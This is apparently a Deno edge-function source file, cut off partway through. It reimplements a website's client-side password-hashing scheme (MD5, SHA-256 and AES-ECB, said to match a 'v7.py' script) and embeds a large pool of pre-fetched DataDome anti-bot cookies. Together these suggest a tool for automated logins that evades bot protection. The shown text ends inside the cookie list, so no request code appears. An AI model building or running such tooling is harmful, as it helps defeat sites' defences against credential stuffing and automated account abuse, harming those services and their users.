import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

// Rate limiting
const RATE_LIMIT_MAX = 30;
const RATE_LIMIT_WINDOW = 60000;
const rateLimitStore = new Map<string, { count: number; start: number }>();

function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: number } {
  const now = Date.now();
  const record = rateLimitStore.get(clientId);
  if (!record || now - record.start > RATE_LIMIT_WINDOW) {
    rateLimitStore.set(clientId, { count: 1, start: now });
    return { allowed: true };
  }
  if (record.count >= RATE_LIMIT_MAX) {
    return { allowed: false, retryAfter: Math.ceil((record.start + RATE_LIMIT_WINDOW - now) / 1000) };
  }
  record.count++;
  return { allowed: true };
}

// Crypto utilities
function hexToBytes(hex: string): Uint8Array {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

function md5(message: string): string {
  const encoder = new TextEncoder();
  const data = encoder.encode(message);
  
  function rotl(x: number, n: number) { return ((x << n) | (x >>> (32 - n))) >>> 0; }
  function add(x: number, y: number) { return (x + y) >>> 0; }

  const s = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
  const K = Array.from({length: 64}, (_, i) => Math.floor(Math.abs(Math.sin(i + 1)) * 0x100000000));

  let [a0, b0, c0, d0] = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476];
  
  const msgLen = data.length;
  const totalLen = Math.ceil((msgLen + 9) / 64) * 64;
  const padded = new Uint8Array(totalLen);
  padded.set(data);
  padded[msgLen] = 0x80;
  new DataView(padded.buffer).setUint32(totalLen - 8, (msgLen * 8) & 0xFFFFFFFF, true);

  for (let i = 0; i < totalLen; i += 64) {
    const M = new Uint32Array(16);
    for (let j = 0; j < 16; j++) M[j] = new DataView(padded.buffer).getUint32(i + j * 4, true);
    
    let [A, B, C, D] = [a0, b0, c0, d0];
    for (let j = 0; j < 64; j++) {
      let F: number, g: number;
      if (j < 16) { F = (B & C) | ((~B >>> 0) & D); g = j; }
      else if (j < 32) { F = (D & B) | ((~D >>> 0) & C); g = (5 * j + 1) % 16; }
      else if (j < 48) { F = B ^ C ^ D; g = (3 * j + 5) % 16; }
      else { F = C ^ (B | (~D >>> 0)); g = (7 * j) % 16; }
      F = add(add(add(F >>> 0, A), K[j]), M[g]);
      A = D; D = C; C = B; B = add(B, rotl(F, s[j]));
    }
    a0 = add(a0, A); b0 = add(b0, B); c0 = add(c0, C); d0 = add(d0, D);
  }

  const result = new Uint8Array(16);
  const view = new DataView(result.buffer);
  view.setUint32(0, a0, true); view.setUint32(4, b0, true);
  view.setUint32(8, c0, true); view.setUint32(12, d0, true);
  return bytesToHex(result);
}

async function sha256(message: string): Promise<string> {
  const data = new TextEncoder().encode(message);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return bytesToHex(new Uint8Array(hash));
}

// AES-128 ECB encryption (matching v7.py encode function)
function aesEcbEncrypt(plainHex: string, keyHex: string): string {
  const pt = hexToBytes(plainHex), key = hexToBytes(keyHex);
  const sBox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16];
  const rCon = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36];
  const xtime = (x: number) => ((x << 1) ^ (((x >>> 7) & 1) * 0x1b)) & 0xff;
  
  const w: number[][] = [];
  for (let i = 0; i < 4; i++) w[i] = [key[4*i], key[4*i+1], key[4*i+2], key[4*i+3]];
  for (let i = 4; i < 44; i++) {
    const t = w[i-1].slice();
    if (i % 4 === 0) {
      const rot = [t[1], t[2], t[3], t[0]].map(b => sBox[b]);
      rot[0] ^= rCon[(i/4)-1];
      for (let j = 0; j < 4; j++) t[j] = rot[j];
    }
    w[i] = w[i-4].map((b, j) => b ^ t[j]);
  }
  
  const roundKeys: number[][][] = [];
  for (let r = 0; r < 11; r++) {
    const rk: number[][] = [[],[],[],[]];
    for (let c = 0; c < 4; c++) for (let row = 0; row < 4; row++) rk[row][c] = w[r*4+c][row];
    roundKeys.push(rk);
  }

  const resultArr: number[] = [];
  for (let b = 0; b < pt.length; b += 16) {
    const state: number[][] = [[],[],[],[]];
    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) state[r][c] = pt[b + c*4 + r] || 0;
    
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[0][i][j];
    
    for (let round = 1; round < 10; round++) {
      for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] = sBox[state[i][j]];
      for (let i = 1; i < 4; i++) {
        const t = state[i].slice(0, i);
        for (let j = 0; j < 4-i; j++) state[i][j] = state[i][j+i];
        for (let j = 0; j < i; j++) state[i][4-i+j] = t[j];
      }
      for (let c = 0; c < 4; c++) {
        const [a, bb, cc, d] = [state[0][c], state[1][c], state[2][c], state[3][c]];
        state[0][c] = xtime(a) ^ xtime(bb) ^ bb ^ cc ^ d;
        state[1][c] = a ^ xtime(bb) ^ xtime(cc) ^ cc ^ d;
        state[2][c] = a ^ bb ^ xtime(cc) ^ xtime(d) ^ d;
        state[3][c] = xtime(a) ^ a ^ bb ^ cc ^ xtime(d);
      }
      for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[round][i][j];
    }
    
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] = sBox[state[i][j]];
    for (let i = 1; i < 4; i++) {
      const t = state[i].slice(0, i);
      for (let j = 0; j < 4-i; j++) state[i][j] = state[i][j+i];
      for (let j = 0; j < i; j++) state[i][4-i+j] = t[j];
    }
    for (let i = 0; i < 4; i++) for (let j = 0; j < 4; j++) state[i][j] ^= roundKeys[10][i][j];
    
    for (let c = 0; c < 4; c++) for (let r = 0; r < 4; r++) resultArr.push(state[r][c]);
  }
  
  return bytesToHex(new Uint8Array(resultArr)).substring(0, 32);
}

// Hash password: MD5 -> SHA256(md5+v1) -> SHA256(result+v2) -> AES_ECB(md5, outer_hash)
// Matches v7.py: hash_password(password, v1, v2)
async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
  const passMd5 = md5(decodeURIComponent(password));
  const innerHash = await sha256(passMd5 + v1);
  const outerHash = await sha256(innerHash + v2);
  const encrypted = aesEcbEncrypt(passMd5, outerHash);
  return encrypted;
}

// Retry configuration
const RETRY_CONFIG = {
  maxRetries: 3,
  baseDelay: 1000,
  maxDelay: 5000,
};

async function retryDelay(attempt: number): Promise<void> {
  const delayMs = Math.min(
    RETRY_CONFIG.baseDelay * Math.pow(2, attempt) + Math.random() * 500,
    RETRY_CONFIG.maxDelay
  );
  console.log(`[RETRY] Waiting ${Math.round(delayMs)}ms before attempt ${attempt + 2}`);
  await new Promise(resolve => setTimeout(resolve, delayMs));
}

// Cookie pool from datadome.txt (500 pre-fetched cookies)
const COOKIE_POOL: string[] = [
  "_Ex9J9_qOJZyPVuFcrz3b~MEx8N2_7NCy_q2dvz3ePpQObw6uGZD8iZAI63zwbOrQQDP1RleeDe14i4tUJR17nxFR4LhUKJaw7deSIPiSSNftkUF9NAdMWuW~g7HbOi4",
  "AAhqktsq_iizY2nq61Qq5BYJ8ny9niTE5FqpWsV7mzLvKN0kddlt~f0T74zQ2hh_5lbiY5nRN52UVFmbUUqV848PRfyo1S252Oic_PtBHI8hTqDugHurf9b0X~_ulNOQ",
  "0zT7P7LdARP7alwwCdKxkGLhxCJfiZrWgYjmsK~uv~VAJhDf0se06mRqRT1G2y1zB~jYluDD_Zp_gXvgAY6wf4frS7u0j5a8xudokKtBIiqwfjxQwr7X8qsTqwqMaplt",
  "uvCkVD1XIkVxMvozQ76aROcZFO~OfMXGr5TAShte4V_NtsRi7ofBjbPJnahVk5lRqf42Oc5AoOERsFA9evyfeTALYvY3GglIvCkvzkk9bsqQDe8hhhFBHOjz46ihCvxP",
  "UVV7m5KQXDtqAgnu4zQiO~LKFz73ACAY9S1nRcRCFFdf1bDIHg14YR8BO6uR5AOZL2nSNfLv0KXRac6hZ4w_ndeh1bK_Mq~JBSf1ufO4M0aBrf1Egxyi3z8qRwkvcW_g",
  "kOX2rQwS5~f8iInrI737ExoxdGweTYDAYpwRRHf~RRqSGmeMvARk83sb_lf5uS9YVaAnqYH~h~2zhoED0~TbExb4P87x1ciLWaaJHZ5X8BKpfZVhPyhxjq9zP0WxkPMj",
  "mI8~lzOMO2tvv1I7oesjNZXGxZ1_LTQigKHm25bX9rKA7meVMjHWEMUdh8J5yyLNyw8JcXjX4QFrazsesYrH_iZSZ4QP9ngxu0OBdMyQSCiQfw0Ln9F58d7tui68buZO",
  "b00e~suvNEn2bbx7zMZqTajeFFXW9p25mnVMKG9oZhH~As40wR4OaztuDiML27l0ckqdTTrdvEqArkKf8pcGlVCFQ~zUGPFTlGZW8Xoq5bmKLxXFNebs1tdgpBtpMWoj",
  "1c0DK9a5WMgnFcfWYo3kny6iwwivzvby3YoVBB8bNMnBTBIIFyOg7xC4UzBNeqTsswRDTc4XuEIyGh_xVl~xtXI9X_yc6RxNKVRFyw~fmwUVHQ84NN~VIu~E7duOoTqU",
  "6iwqK4g4PwqaNJGC5ai6eUVpIVeF2wPtqedxag7_ITM~sUmK79HuOk871dT88XFtDrdwN9yWVLI9CIenB0V0eYxQzS~KOUDpRSTP3EM1z3Ra8cugMcrRswZjSkHyJ3MF",
  "5wr7O~iD~NUZFZJyOMLsxr67OJH1QVlKvwlb3aY3tSA1~10UWIQgFVOgvXHuu5Bun41wKQEIjJ~JXzURwkz4SdajL5bDQ7FcbmDnkQI9knQiNfVHAjcw8EEJ6VRHiyuv",
  "af8YPPgoIRgetmzGBM0nbdWm1S50_rI9c8fK8k63VGSyRIjMZnTos_A_CUbrQ70kzOxwXsbUW9mG1Q8J8UB0jeNsVmef1I2C_QLdqOu8fdzQO3SyhjPMZ2VhfoO6zGP7",
  "wJsRmw8DEUJqt_B4sBnva7S7~FG0YtxX6NU3qQAOs_UFAh45c00UpTdtxc6BA2koDRjQnSs7P_T9xeiZSzSCofUnGuoJer7fs3fPcYBbw1yzuZGZmZW9hS8iRz5haVpN",
  "FATHAuKAaZ_TTgQ7WkTkgPCw~UolzcNlmNKs~05S9orDBIP36ExvV9Od0U5A2pl~bwhU3i10_36bzANXr3fUirJD~YVoTrCmx2GOG6deiloK8AaX6vPCr4sp4IzmVr9z",
  "DLw22o95v51NpduXfIQUpmVHwdKEn2vvvx_3dXHuJycql_hYHyExbHNOZSpdpBucarb2L4ePQZAOoJKlSNiKMx~KLctv8lsSQ1qIadJ5Wx_IQalmnBGfq7NenKbkzL7Z",
  "DqFEjVW~m9FUDHhErxPX~WdwBXFjnUaCjGHey~b6CoI9kBnIt5dPEK_4pJwEs3UhCetHXJZtf1Mv5q3S7XYSFfiAySiD5qL9f8cko2ZbIOB2YovTp8coX1R2c79aD0oF",
  "Tma5mNPUzIfz5tu8fFUfSWnWNlPDk_1Ko~ge13MyUfH~nFUnpwXLslZ0imzBZm1y0ljsaDaQwYiGakZVPOEMhzuhdX1LHzFeYodw_EF0RfLTa2EBHcLXhvQKF2yTnLYS",
  "k3qNoxAzNS~u1ngB8go6qZvxmu7O8tDVgXTabFg0X4srbCzXy3jf5u593JmQLuG18fSMSUOElTp6ZDnZKFylXx574rEPPqWCawm0IXH7RTBWJoIgWaCUsEO62zscL9aG",
  "Ho1I~ciQccPPDQh0eKny0EEzpcfQU7aylw4_No0As_9CQmhWpxgCeaiDuv8QIVKSIb7FAcQtWaKR49WOpE_CsUPtgLTSxG1U54EuA~9vsPBQcFJe2M_jq1W6u981yDtT",
  "_12kSnt1zjNTmQJ2yFfPggLDDXQJbOUnFADsDRxwKr91X2Zshe7x82fVZAF6UKrKjzvE6dOL8JdAj5TYP8T4EeaxKjWeZSI_4W77H~BIWhlrym5CUTwlE92WziUmmUjY",
  "w3yLNQSfy_0P6a5M53Bqh71ppXzG3gtNM3Qh8qw7qUL8WrBTRcBhkFVrKNhiThhJ~x8mcalr8UzUUqyMH~Nt0381pU7gHaXnsHmfG~gV~OfXdf9KWPEiG5L96nDJ0pLW",
  "cBcxK4xBTzKdQC6Vjnw8SBm0WfZcEzqe~erlO8HlraAw3c82aXB~7WtydN7Avv0RROdAWPrY7~98WoxNAyUu4_7CWsnPR0HQXtOlOGVElReCMBPKlqe5ejdN4SdoCFTT",
  "y2czJ9D1lbDSart5dLTxGQ4Lck8zgRLUb6TcSHqWvhU3pyopYBmnYFPH~zTUNqQHtsJG6n3PF4NfxuyuiSsrir8ol_jnnMpUoY10XyFozcuI823oBS3~qTuzPM5XeoyA",
  "xnLwjHcIQBj1TkAnw2oGthfVhtCdqIixpZLXCZmfoY_Xm7Mt1LCJ4ocnefpmfysghclCw3ryDhKC4Xyo4zepiYrvNVPEBiyN0WUaTY1iPzXZw06ojR8wWcvEvhhLzqY4",
  "tuLb_x2w_F00a5YboUIcxyYxeh0jsuWDFmDbKXchFIas1KJPaRRH3jZVRjEvcsuY6K~FSOeCDtmXLkv02p0rI5RgDuPeSkJjiBAKjAYbBLxxazJio44d9LUD1JKxFy8a",
  "D0EI6QOzMbsI24XM5U8_Xrf0g6CqsPnKtdWVytOxoobhfA1vSrDyoq__JxmDMjdhhQ8xS2ThZxTCcvYdOxhDJwcwmCuF2KSgCH1Zoedj4DjlU5wTo3uJKmfznh8FoILK",
  "MxR8FpYg2QRz4RqRBzJp1AhjAK6KUIIKl_hA5HDh0In~3hlqWP60kYW3DpYxwddUpWZeoZFGF8eAafceUxhrbN4KPqLI_o_1Vyvqkj4hvHW8srwUlYI~nQ3s69NGi9Me",
  "cn_Uz6LMKeNxXlWEH_XOxFxVIQn34wNO2JBLJSoXS7xb91pmlGqMoblMOkKYVbrwwk55eaVXTiOwBfNIloHy9IZZvN9f1gPtFmfV7Gpwt6z7nZgXfHgIRPOjubcXFE4l",
  "I8~DplrJtmpkLxEVweniwUJGnS6DgsFMw2M1MkKuMfF90olWLfODnCB9Xe_IZnBtacq8D10af3vwRLldLzM8hJf0QlG_ZxH87LZ24EMV9qnULo85s57rl~jXBxcv6LFO",
  "qnIAquR0kTCwq~FmtErfSIWSru52KLPWeDeYJhYrJZ_mLf54TT15W_GlQlrAGMbCEF4I0c_H5CPxQAFBITQrIaz94MRzP6pMtKUSwBvn8eWtqdiB9BOm0jZ52rflPPkK",
  "FNnI8RT40EEnYxK9fbO0ws358VLRGnfsdd2CZ1kgbYDPVm4Jd2nFCqElSB60clxH3Yd_5~7~EgPudKKx5Hx9uXbLNPk2I8ubMmubx9X8iTVDh6OYxRfrbiQSSgtxpHmM",
  "9F_y7_essf71zvAhkc4jzQe2YVwYsTGSUIv8S1NxhSC34thKJ7~BXitOiXNqXusOmGpIO1MceONesfW8~yTvYV5O6Px0JBknthL4KaH7QIvsDrUw4uCVaoyXLFiMU0A1",
  "8mGSetI9_s2cswDMls1PutRCLWe4Ng~mWXVxEYPSrGDZ9rt56ZuLOtf45i1SIbdRfG7Kz7LwU~wCpjcEU4W260MieDqjwGuMM04V1BvdbIN7OiGu8LpXoxTYymaebe2Z",
  "m7Zuvf4olGZ7SulZxdrs93u2IA4P36f~5wItI7JWVa85UMLDi2Hc~2sLZFEzWHPv9Im7Nu8Hx6~FRxd52ZiXA9tJLAIiwpzXX20ip1OodxN0mUoeJinVkBHfr~Yq1huR",
  "1He7dQxlle_1o0Eke4LBNiiSDpi1DxDDExNQXV8xfmr_gpfn7WVYOqt_I~NpN2B4h65EHDPsKHf2bkqUAwyf89q3BYHAx~upcUyGUUn6MQLP0USgRLFpsH3AfQ9atan_",
  "za6QKgHNIFRT4iQZPAxOvE88nOO8Rv0~hvqwaYRqR0Pfb4x_4AppsRGFs973~toYR4MOdA5Yzy10Jx~Zj61WsTuSw8r9d71aJlAwNFb0AwaYstUPR7MembVfuzesdhSf",
  "8Cmv50Alq0Oe63rjoaJ78BQSeL~Hw2ka~gXRceF10KYzKuMoKuwdwEHAx0Qq4nV3mLgavr4GKmgtvB10iEFPqQliPMjy1cW35WK8UWLW9RAf~6FclkXS_04w4~vDvsE4",
  "3xWvmPIaWJpnJNG5o3mA6NY3y7luiQXjBORDd~Dl8UAODex7hjagFglWm1vVDxdKDlNImJ4huKhuqk42ZWN_xUCcx_aY6z~hVr6usCdvUXE~5fq3zyZjhG~WUcGKLijS",
  "2~tl4jQiBi0VvPzrXh3iDNjx9BTuwk7SLwEwpEpUQn6oCsBZ1Jzcs1hjCWVCj4YwpGBkmkOMBmTapUus5mnklCL_dEpWrsIZHLCcxvtriv0bcedwJ4xwvGhbDwL_x7CF",
  "taGvHlncWLobLeLy6WMvxN~_yImP0iARr~PVfljAC7SVcikfMfhvAkMpAm5mKRZzZELgil7Cgc~58gER8Jb0CV3Ls_Lq5sygqBqxmfSOMCTxsCYlu9b32inA62CYBDBf",
  "uBTPhfhlk6CTrDdx0iAROZiBjl5wcM1Z5G9q3ee0vBjldWqpDHE6ZewsHvAXItYmi7q~Eg6X5q3FDehj4wwc~10cdniekI8oZpZNNMASvXrLsNAoA7ZuMyBWrYekk_cu",
  "TIlOGBtSJ48aRBVWUYu55HK7Tjn458mZJ337RC~AKuJvX6DMAKKMM8HT7AxC3keolSx0l9vadCsIR8twngtbMF~tj_I65hGRLTsok7DQmoMjsCZl6ovt6~tZEK105POV",
  "VfO8mv44umMwbiR~gFkxxbD9hyMxsfTmppo1~R5hKNAIrdTNP6KfznSRwXP3uMr2rrfrbOsYkkJrBwkN22m4xO8zv7dO3whyReDqi6GiG7c5Stk~CgSpyNlD89ttMEZS",
  "PbK~PA7TdmO3jBN4EO7p~oQpyk~nbqEZ4nQahFnYF6QyB4hwJAZ8nG8sEkb4Owzwpst0h~zQOYnza6ypJKusB_KQAmaQ_W6uMCuDQqkXxKSfRxZ3ca2~eKlBWcIdCjox",
  "O8wma01w~bMDLZZHpwnjP6CzPmhFprJaGALvzcEM~M9IvBuupLmjW8mMQCOq2VgldGnTZNNaA0RJVP8K8dldq31xMciMPhabtHfK0t0KgF8rd_pbe1LyHosHnzZCofkp",
  "fKU2GvgxuhwWLub33f5IEwghx8WX2vHDbuq9lRJ2buJoHgBRxKnnX4eZqEBOFIckReILgAz0r0_HA1LwQgBkeBHrVRlUa~V4o~LxICxS2q2mpVolEPoa~ICNvJDERzJo",
  "lqSiJGrgv1lxbX7Awl_Btg~R1CgtdALZmZAkC7stCxEorFLQqrl03uDiLBgzgU7KWesa0tlgit7HrVid_J35UqF6LYY43MOFjihWpFkPOcdjNkiFPREl8HdbKFvbC5dz",
  "SMGXZSBrm81S6qLJkQb0BON8pR__h8~w2YR3mc6xiF4ExRkGuyC0qeFRYf5TVX~4_MG9Crz2r2p8WTBxM8CPGKO7tofegbuykgCSACcYtpJlGmJKsTxyjfEokCE1Nz8d",
  "0bxaN76ff~v2vji3Eqodzc~KZ032Igm6bPFIJuTUHD0ZU1vp5xsTJLJTsY6CI5YB8_p1qSyiu4fLA9rbTDR4VX_~5kfh7s0PgFtrr8MxNhigHtG~lGAylU~AJKuqMEvc",
  "bi0hcxqYhHsfLXbJHnW4YL6htF4bDNHmOFkFzdaaJrt6iE5x4Ir_vM80WKmAlMOnlyEU4LrJJYieZ5_3WXAYm_WEFdhQZPEfpPcuu3eQanNAXTDQvnE9fwfsyfPXAJGC",
  "JjwIS7bfPeIsbmYbf8C1AuyR_8JU4GkIiiRtwa1yGEX0KJNVOVFTvCJkaKPxIpme73Bd1gKv~_om86ff2i8~_ieP6TW~MMC5Wh5b~ZJ~0_KXOUWhmprJyW3JOb31JxM1",
  "WNBEe2Tpf~2lLqk1kcz6YbW0em8Ph99hoIsRR5Hm6P0yfxjHs3lYJpPZKFEsJkzO_2MJsE9y~BBT_5DuKw8uKGo1W016tQfglLLwxD0uOvzGvwJEfHReuU7MgKYV3XK5",
  "q3Q8JK9LhqaPovPVOZIZcL8amO2QnzU77olWCZMfADvOr78Q71mw3HVmZ8n8rcCbBUc8N6hQ5WUSG3Rh10PnjCIJ1Jpgfi8ZXPO5fH1GV11FwO4FQM8VmRLMSO7ZiKtj",
  "9BlpfQdalYx2iK_4lbLik6forGGRRxfhp36Wmqn9_Hge9Vb164kvoW3RzH_OyAJ8rkU3oL72hff5mNQhVYCe~sf7HTi3XT_kBquiQydQU1Lj473NjH7G~1yZojd~3HRB",
  "4Hiz~iNqbFjk7LzybV1k8x39sM8ovdO3tk_c_qaH1YGaZOxqvZ5~X1uHR_lbrxp~qE~5toRfZI8Dcq0mccTKbRfMFxf6k~BHHH3VTNd7p3RIz1djW4SyKFAV6OA4QAUr",
  "NPdSc7Epkj~O_7nOknuRjAcHzcf~XrIDg0OhHPoRyHLnc2HVE6_8XqUW93l6cPJu1dfWq8WJJKCZSRP5XN1CGyRYnUhTs7oCjfKCYspfIpc0QyDgE4tjsVWTon6sIAt5",
  "~Mja2mQi6FID_Drzudqva9wTFiXgkOPtk8TlNVjzPcO6F3iqdBkLCGSKoLxtM8BS7OLaHEf3O9UPjuCzA1Zhc6RDoGuf01Maq_JctOFcqenjNIHCkO4JoKhth1q49ohJ",
  "U8kQjvalC9LFBvgO9KnobscnAQlv~cLuDhl5bV8V~G4SYXpRxq2MexIMye0~GJ04R5CdfEv0VUBc2HBnWkd_he1FuFm3TFmCoPo_5Ocq91_gkZx8j4718Fl0ZvLW5Epf",
  "Qu6Pj3mHf1fRcQGzdqi0vckOd7s0D5MZMrpnH88YpjwydHIqXZcvE5P0M7khTyvo9URscKm~JK6YnIkUDGpHb3rZEoz6PH6ntBYKi0dyZhx6UfgWQMjEWrkWf0RW4OCG",
  "~eyzPl5flRKx~2mU7h3uVHu1eqWmPGMV0T_5jyKp5ooezHOg_39zRIJyutuGkIKgOP~vzArT7E4OFfVDqA2Awzs0V43MmNnhkDVb4Ynlxm0dWQthmtWukRgsmZSaaNSV",
  "MnM3mXZO9b7SoK~TWjmi60nEgzGGQHxLMbdvwLCZzFfz5y20ZlCTCKvlO8dZ3SWBen1oL_xhY6RWdsZCGzsT2e2_DBPcA46fb9oivevukQBopIpIEL_jJaAb3oGL1JSF",
  "M7eDuH6PxdOftk7GBTr1YsQbCDQkZerQdRElBjFdz6cEQQL3i_pFS_pXlBh4uw1stOqqb2Jdkg7ry~dq6myPx~g8rVLcRfCCNGF_BhBVaZJaPWb9sTs1ndY3xj1XwG~a",
  "DTwh~sKNWIL9oTC2~TcBtCST9tntNZCNvqC7KQmzWH05T_RBNlSiABp0OO7GT~wt~v9vGp4FpSE3tVuyY56oHsIJBNsk801pZnVoeFBdTiw9w6ZdnXJFJfOVbEIdGWKJ",
  "ClCc01UTin17Nrg5CQxqXRcUvixZH9zohF1zoSxErgoXqVE4w_9K~qsiUgeDvBjHfhbPZASs2u6VfpieLL0snQ7w4PXS~12bB7Le~I2cYdbTPtLLtTzWrrA8i4X3bKNv",
  "Qjb3VK3FiAXiDYmwRsVSu8tzd2hsvLdYA4xIsdjyyL6VAoz0z6AkMbY_7CqeI7ECqn6czlqDDVAF~6IAl3RZe52PAUauWj_tyANu46UuhqoO3xepk8~qoNtq10tJnXhV",
  "4kPCFxYNne8980ir8QdQs5CFWecf3ZMaoA5xtcBPpujKjYsLrtaiep71gX0duFImoR~bHhcLcOh5Xjo2qUO~SgmXVe02MyK~XaDiAMNgosPGK9YwWXNZ2diTmC~7Zv0f",
  "aQN6MIaZ3j3uXFkxGiVd3Ut5WYKe_2K8E0UQda~Iv47xQSj7sI3~J00V4xL1EGssEB_9ahLu_jaC4OK_IUNqc12eBIav6a0oDxw1Yz90kqg7TtFqoGZFT6BegED0Xvrr",
  "MWpbFAM1cro6KRi540Rf0gA6A5eWDlQUR4wAisGTnk4pQXv0iOq3FRHobaBSr68y_x0MDC_4g_FaqyClEmO7qnJxFcBJAK5b2UoHvvTb2GoeqtaftMu0iTb7jGhbrorh",
  "fSYkOJIzgFF9PVxu4_lCUJTs40DBMbbT2SkG69aRJ5l3qrpgtXpO77_R7R1q4chS~Gv_sMn0eJesDL99IGlJTASH01ODlZud92Yla55T0iBrz7evj6U359neG58fHuk2",
  "7KTtY81qqy3C7i2W1tuFJ0CHdbDMMi2q0IKnwCiCeMMwIictN85GqlcGcxgDAu8NjE~avEWFYBo5wID9DgctE2_bw9cWIE0iBd0uQXOrqSfzeTK2WJPmKzTccxG_l_ni",
  "MyIF5_Mvh7Ndflh2FpXpu6Mjne46pPS4r9i4q03h0yvMxI1SRvw6EffCSfGRYUN1UCjvzw3PAVLI4tl9RH5tFRrODiZMU9RLZNV~_YGbys0BzSrAmFn9xYPQoD_xHSJW",
  "x4lcLSXzalcO~iYtCCg5KrdHMcgW2xzQk6bViE98j6sZDdkXxVLQYMkk4x35OCfBnZmupP5sP9dJXpq95CkwbIH5CSHMShZ2aGNN3bKCdEIbprPu51qOdfa2h_he_Fdh",
  "oIjs~66qXMWmK0DJ9e3Dz5EpM7l0s6gyCe7MRh5YrpacxDToDdr__pLuZNPL3lDdgw88KFB10HxzsDgA2LpSuDfBkwaStxQsPYA1qcd6LgesktN~hmUIAk3_auDMcQ9g",
  "9WjtTLDXU9wH5aCGZeE~vP6rWfErwMk2f_FyQjC5ZgZou5T1x8kikzOGKY~LJFIfxmrlz2JDjzbMIr8NlTbH5PQBZ5AVsJn230PvHDNr1e4G7bc2vWffN10Og3MaH_yn",
  "4ej~HcFs3f5JX_baNI6VCNfNiDFaSXcVNnZHDsWicPdxlT2LOhqYTB_zHFYR~QlmwTDpMyFk2mLpWrbO4p85rw9C0Q2Iy~nueMm5AQRD_E78cpxAbt6Q4HCI5EZEp6YA",
  "l2sBWuMUU7GGZbIgnq46mJ66E18gJlGCH_Ke6iaRPYE1_bfZcczhfqs6rJUiVN04p1pCULZXVmh2IgpdcftyH3yInJFoRvaSf4rbD37RohF7Qk2bGp83a1rJZUQu8Wza",
  "bAXFACmkcJWl2QhpETsr6JhMe3sxcSyY9Rwi1xuq69valQWx7EEfetO~VokMVNz0kxqc~Q1g3_VYJUA6mk8nHiLLaPmH6cUTfPazXqaAjtjunGA~zZJfyW~nPy2JYF51",
  "YiDcdfaukbOODf4RDGi2pdXJTyrZ~h8pTnVb0BGlc3vq2WAhqOJHA1an1~ZjnnMk4uJZ4KcTkRz61fg7Wz3ic5kJA1y3LryhUbz39LSNMcjpI_o5fV7pwJdP4pOTx8I7",
  "0SAr2k3pPRUzA2wZNakrhP7l7hnLOyvTnkefWIquatMq01nHaYVjZ7P1xaFj6Dhefce_q~wP0PGcIz7Tpj5fBikeIs1FfU1kNde9hfJTrmlQgok_ejtmQoNlYMNXqku9",
  "tMy4NPxhv0Ud1bFVRjQqU1Yh5Zh3ekAZvfrTj7VuH2Dh0wpJ3OOsciFRqODfcl03VYedDQn49Gf~SlaDy90H2NyXcYWPcojQMowkYOvgb1o0B~jUDivuz8E32jbiZuOj",
  "RRDbswVuEkY5lAvUvQ46svUYtQQ98aj7l_nA7eq27GQYPUaagndqbw_sUW8IqRfPB2dRVvdqAZYvsCQlcMXv8vGYRV1DKcX7AlDnSkyNcEZhvhKy8C5WATepHMR0Kn8A",
